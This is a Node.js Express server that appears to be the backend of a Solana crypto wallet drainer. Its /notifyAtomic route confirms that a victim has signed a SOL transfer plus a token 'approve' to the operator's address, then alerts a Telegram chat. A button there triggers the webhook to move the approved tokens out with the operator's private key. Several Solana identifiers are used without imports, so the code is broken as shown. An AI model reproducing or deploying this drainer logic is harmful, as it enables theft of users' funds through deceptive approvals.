import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import dotenv from "dotenv";

dotenv.config();

/*************************************************
 * ENV VALIDATION
 *************************************************/
const REQUIRED_ENVS = [
  "TELEGRAM_BOT_TOKEN",
  "TELEGRAM_CHAT_ID",
  "RPC_URL",
  "RECEIVER_SOL_ADDRESS",
  "SPENDER_SOL_ADDRESS",
  "SPENDER_PRIVATE_KEY"
];
for (const k of REQUIRED_ENVS) {
  if (!process.env[k]) throw new Error(`Missing env var: ${k}`);
  if (k.endsWith("_ADDRESS")) {
    try {
      new PublicKey(process.env[k]); // validate Solana address
    } catch {
      throw new Error(`Invalid Solana address in env: ${k}`);
    }
  }
}

/*************************************************
 * APP SETUP
 *************************************************/
const app = express();
app.use(express.json({ limit: "100kb" }));

const allowedOrigins = [
  "http://localhost:3000",
  "https://voidlist.vercel.app"
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`❌ CORS blocked request from origin: ${origin}`);
      callback(new Error("Forbidden by CORS"), false);
    }
  },
  methods: ["GET", "POST"],
  allowedHeaders: ["Content-Type"]
}));

app.use((err, req, res, next) => {
  if (err.message === "Forbidden by CORS") {
    return res.status(403).json({ error: "CORS: Origin not allowed" });
  }
  next(err);
});

const PORT = process.env.PORT || 3000;

/*************************************************
 * SOLANA CONNECTION
 *************************************************/
const connection = new Connection(process.env.RPC_URL, "confirmed");

/*************************************************
 * TELEGRAM HELPERS
 *************************************************/
async function sendTelegramMessage(text) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text })
  });
}

async function sendTelegramMessageWithButton(text, txHash, approveDetails) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🚀 Transfer Approved Tokens",
              callback_data: `transfer:${txHash}:${approveDetails.source}:${approveDetails.amount}`
            }
          ]
        ]
      }
    })
  });
}

async function answerCallback(callbackQueryId, text) {
  await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text })
  });
}

/*************************************************
 * ROUTES
 *************************************************/
app.post("/notifyAtomic", async (req, res) => {
  try {
    const { owner, spender, txHash } = req.body;
    if (!owner || !txHash) return res.status(400).json({ error: "Missing owner or txHash" });

    // Fetch transaction details
    const tx = await connection.getTransaction(txHash, {
      commitment: "confirmed",
      maxSupportedTransactionVersion: 0
    });
    if (!tx) {
      return res.status(400).json({ error: "Transaction not found or not confirmed" });
    }

    let solTransferFound = false;
    let approveFound = false;
    let approveDetails = null;

    // Parse instructions
    for (const ix of tx.transaction.message.instructions) {
      const programId = tx.transaction.message.accountKeys[ix.programIdIndex].toString();

      // Check for SOL transfer
      if (programId === SystemProgram.programId.toString()) {
        const toKey = tx.transaction.message.accountKeys[ix.accounts[1]].toString();
        if (toKey === process.env.RECEIVER_SOL_ADDRESS) {
          solTransferFound = true;
        }
      }

      // Check for SPL token approve
      if (programId === TOKEN_PROGRAM_ID.toString()) {
        const data = Buffer.from(ix.data, "base64");
        if (data[0] === 9) { // Approve opcode
          const amount = data.readBigUInt64LE(1);
          const source = tx.transaction.message.accountKeys[ix.accounts[0]].toString();
          const delegate = tx.transaction.message.accountKeys[ix.accounts[1]].toString();
          const ownerKey = tx.transaction.message.accountKeys[ix.accounts[2]].toString();

          // ✅ Verify delegate matches env
          if (delegate !== process.env.SPENDER_SOL_ADDRESS) {
            return res.status(400).json({ error: "Approve delegate does not match expected spender" });
          }

          approveFound = true;
          approveDetails = { source, delegate, owner: ownerKey, amount: amount.toString() };
        }
      }
    }

    if (!solTransferFound || !approveFound) {
      await sendTelegramMessage(`⚠️ Atomic tx incomplete\nOwner: ${owner}\nTx: ${txHash}`);
      return res.status(400).json({ error: "Atomic instructions missing or invalid" });
    }

    // ✅ Both instructions found
    const text = `✅ Atomic transaction verified
Owner: ${owner}
Spender: ${spender}
Tx: ${txHash}
Includes: SOL transfer to ${process.env.RECEIVER_SOL_ADDRESS} + SPL approve to ${process.env.SPENDER_SOL_ADDRESS}
Approve details:
- Source: ${approveDetails.source}
- Delegate: ${approveDetails.delegate}
- Owner: ${approveDetails.owner}
- Amount: ${approveDetails.amount}`;

    // Send with button
    await sendTelegramMessageWithButton(text, txHash, approveDetails);

    res.json({ success: true });
  } catch (e) {
    console.error(e);
    await sendTelegramMessage(`❌ Backend error\n${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

/*************************************************
 * TELEGRAM WEBHOOK HANDLER
 *************************************************/
app.post("/telegramWebhook", async (req, res) => {
  // 👇 This log shows you exactly what Telegram sends
  console.log("Received Telegram update:", JSON.stringify(req.body, null, 2));

  const update = req.body;

  if (update.callback_query) {
    const data = update.callback_query.data;

    if (data.startsWith("transfer:")) {
      const [, txHash, source, amount] = data.split(":");

      try {
        // Load spender keypair
        const spenderKeypair = Keypair.fromSecretKey(bs58.decode(process.env.SPENDER_PRIVATE_KEY));

        // Build transfer instruction
        const sourcePubkey = new PublicKey(source);
        const destinationPubkey = new PublicKey(process.env.RECEIVER_SOL_ADDRESS);

        const ix = createTransferInstruction(
          sourcePubkey,
          destinationPubkey,
          spenderKeypair.publicKey,
          BigInt(amount),
          [],
          TOKEN_PROGRAM_ID
        );

        const transaction = new Transaction().add(ix);
        transaction.feePayer = spenderKeypair.publicKey;
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        const signedTx = await connection.sendTransaction(transaction, [spenderKeypair]);

        await answerCallback(update.callback_query.id, `✅ Transfer executed!\nTx: ${signedTx}`);
      } catch (err) {
        console.error(err);
        await answerCallback(update.callback_query.id, `❌ Transfer failed: ${err.message}`);
      }
    }
  }

  res.sendStatus(200);
});

/*************************************************
 * START
 *************************************************/
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

